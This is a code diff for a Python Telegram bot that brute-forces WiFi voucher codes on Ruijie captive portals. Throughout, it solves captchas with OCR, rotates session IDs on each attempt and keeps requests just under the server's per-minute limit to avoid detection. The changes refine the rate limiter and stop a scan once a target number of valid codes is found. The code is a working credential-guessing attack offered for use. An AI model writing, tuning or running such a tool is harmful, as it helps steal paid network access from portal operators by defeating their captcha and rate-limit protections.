@@ -51,18 +51,18 @@ limited_messages = {}
 session = None
 _connector = None
 CONCURRENCY = 300
-BATCH_SIZE = 500
-CAPTCHA_RETRY = 8           # ⭐ 2026: captcha auto-trigger ကြောင့် retry တိုး
-MAX_ATTEMPTS = 3            # ⭐ 2026: session rotation ကြောင့် attempt တိုး
+BATCH_SIZE = 30
+CAPTCHA_RETRY = 8
+MAX_ATTEMPTS = 3
 PROGRESS_INTERVAL = 3
 GITHUB_INTERVAL = 30
 SESSION_RECHECK_INTERVAL = 600
 SESSION_FAIL_THRESHOLD = 3
-RATE_LIMIT_WINDOW = 60      # ⭐ 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit
-MAX_VOUCHER_PER_MIN = 25    # ⭐ 2026: ၃၀ ကြိမ် limit မရောက်အောင် ၂၅ ကြိမ်ပဲ
+RATE_LIMIT_WINDOW = 60
+MAX_VOUCHER_PER_MIN = 25        # ⭐ Bot ၁ ခုအတွက် (server limit ၃၀/min အောက်)
 _voucher_sem = None
 _ocr_lock = None
-_rate_limiter = None         # ⭐ 2026: rate limiter
+_rate_limiter = None
 _start_time = time.monotonic()
 
 # ── Portal Configuration (2026 Update) ────────────────────────────────────
@@ -103,28 +103,28 @@ def get_portal_config(session_url=None):
             return PORTAL_CONFIGS["portal-as"], "portal-as"
     return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
-# ── ⭐ 2026: Rate Limiter ──────────────────────────────────────────────────
+# ── RateLimiter — leaky bucket ────────────────────────────────────────────
 class RateLimiter:
-    """Ruijie 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit ရှိသည်။"""
+    """
+    Ruijie 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit ရှိသည်။
+    Leaky bucket: smooth dispatch — lock ကို sleep အတွင်း မကိုင်ထား။
+    """
     def __init__(self, max_per_minute=25):
         self.max_per_minute = max_per_minute
-        self.timestamps = []
+        self.interval = 60.0 / max_per_minute
+        self.next_slot = 0.0
         self.lock = asyncio.Lock()
 
     async def acquire(self):
         async with self.lock:
             now = time.monotonic()
-            self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
-            if len(self.timestamps) >= self.max_per_minute:
-                wait = RATE_LIMIT_WINDOW - (now - self.timestamps[0]) + 0.1
-                if wait > 0:
-                    log.info(f"[rate-limiter] waiting {wait:.1f}s (limit: {self.max_per_minute}/min)")
-                    await asyncio.sleep(wait)
-                    now = time.monotonic()
-                    self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
-            self.timestamps.append(time.monotonic())
+            wait_until = max(now, self.next_slot)
+            self.next_slot = wait_until + self.interval
+        wait = wait_until - time.monotonic()
+        if wait > 0:
+            await asyncio.sleep(wait)
 
-# ── ⭐ Helper functions ────────────────────────────────────────────────────
+# ── Helper functions ──────────────────────────────────────────────────────
 def _truncate(text, limit=TG_MAX_LEN):
     if len(text) <= limit:
         return text
@@ -361,7 +361,7 @@ async def get_balance(token, portal_config):
         log.error(f"[get_balance] error for {token}: {e}")
         return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
 
-# ── Deterministic code iterator (resume-friendly) ─────────────────────────
+# ── Deterministic code iterator ───────────────────────────────────────────
 def _get_charset(mode):
     if mode == 1:
         return string.digits
@@ -400,7 +400,7 @@ def format_progress(checked, total=None, speed=0, found=0, target=None):
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
 
-# ── Captcha handling (2026 Update: serialized + robust) ───────────────────
+# ── Captcha handling ──────────────────────────────────────────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
@@ -492,7 +492,7 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
         data = await req.json()
         return session_id if data.get("success") == True else None
 
-# ── Session validity check (lenient) ──────────────────────────────────────
+# ── Session validity check ────────────────────────────────────────────────
 async def check_session_url(session_url):
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -530,7 +530,7 @@ async def check_session_url(session_url):
     except Exception:
         return None
 
-# ── Core voucher check (2026 Update) ──────────────────────────────────────
+# ── Core voucher check ────────────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                         message=None, plan_filters=None):
     global _connector, _rate_limiter
@@ -539,7 +539,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if not current_task or current_task.get("scan_id") != scan_id:
             return
 
-    # ⭐ 2026: Rate limiter — ၃၀ ကြိမ် limit မရောက်အောင်
     if _rate_limiter is None:
         _rate_limiter = RateLimiter(MAX_VOUCHER_PER_MIN)
     await _rate_limiter.acquire()
@@ -559,7 +558,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
-            # ⭐ 2026: Session ID rotation — every attempt gets fresh session
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
                 continue
@@ -722,7 +720,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     chat_id, limited_messages[chat_id], full
                 )
 
-# ── Brute-force runner (resume-friendly) ─────────────────────────────────
+# ── Brute-force runner ────────────────────────────────────────────────────
 async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                          target=None, message=None, progress_msg=None,
                          plan_filters=None, start_index=0):
@@ -778,33 +776,42 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                     )
                     return res, idx
 
-            results = await asyncio.gather(*[_check(c, i) for c, i in batch],
-                                           return_exceptions=True)
+            tasks = [asyncio.create_task(_check(c, i)) for c, i in batch]
+            target_reached = False
 
-            for res in results:
-                if isinstance(res, Exception):
+            for coro in asyncio.as_completed(tasks):
+                try:
+                    r, idx = await coro
+                except Exception:
                     continue
-                r, idx = res
+
                 last_saved_index = idx + 1
+                checked += 1
+
                 if r:
                     found += 1
                     if target and found >= target:
-                        await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
-                        scan_tasks.pop(chat_id, None)
-                        last_scan_params.pop(chat_id, None)
-                        return
+                        target_reached = True
+                        for t in tasks:
+                            if not t.done():
+                                t.cancel()
+                        break
 
-            checked += len(batch)
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                now = time.monotonic()
+                if now - last_progress_update >= PROGRESS_INTERVAL:
+                    elapsed = now - scan_start
+                    speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                    text = format_progress(checked, None, speed, found, target)
+                    new_id = await _safe_edit(chat_id, progress_msg.message_id, text)
+                    if new_id != progress_msg.message_id:
+                        progress_msg.message_id = new_id
+                    last_progress_update = now
 
-            now = time.monotonic()
-            if now - last_progress_update >= PROGRESS_INTERVAL:
-                text = format_progress(checked, None, speed, found, target)
-                new_id = await _safe_edit(chat_id, progress_msg.message_id, text)
-                if new_id != progress_msg.message_id:
-                    progress_msg.message_id = new_id
-                last_progress_update = now
+            if target_reached:
+                await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
+                scan_tasks.pop(chat_id, None)
+                last_scan_params.pop(chat_id, None)
+                return
 
             last_scan_index[chat_id] = last_saved_index
     finally:
@@ -840,7 +847,7 @@ async def github_update_scheduler():
             for item in items:
                 await SUCCESS_CODE.put(item)
 
-# ── Session recheck (lenient, threshold-based) ────────────────────────────
+# ── Session recheck ───────────────────────────────────────────────────────
 async def session_recheck_scheduler():
     global session_fail_count
     while True:
@@ -911,7 +918,7 @@ async def help_cmd(message):
         "   ဥပမာ: /brute 1 6 5\n\n"
         "၃။ /status  – အခြေအနေကြည့်\n"
         "၄။ /stop    – ရပ်တန့်ခြင်း\n"
-        "၅။ /resume  – ဆက်ရှာဖွေခြင်း (ရပ်ခဲ့တဲ့နေရာကနေ)\n"
+        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
         "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
         "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
         "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
@@ -1222,7 +1229,8 @@ async def status(message):
 
     rate_info = "N/A"
     if _rate_limiter is not None:
-        rate_info = f"{len(_rate_limiter.timestamps)}/{MAX_VOUCHER_PER_MIN} per min"
+        next_slot_wait = max(0, _rate_limiter.next_slot - time.monotonic())
+        rate_info = f"{MAX_VOUCHER_PER_MIN}/min (next in {next_slot_wait:.2f}s)"
 
     await bot.reply_to(
         message,
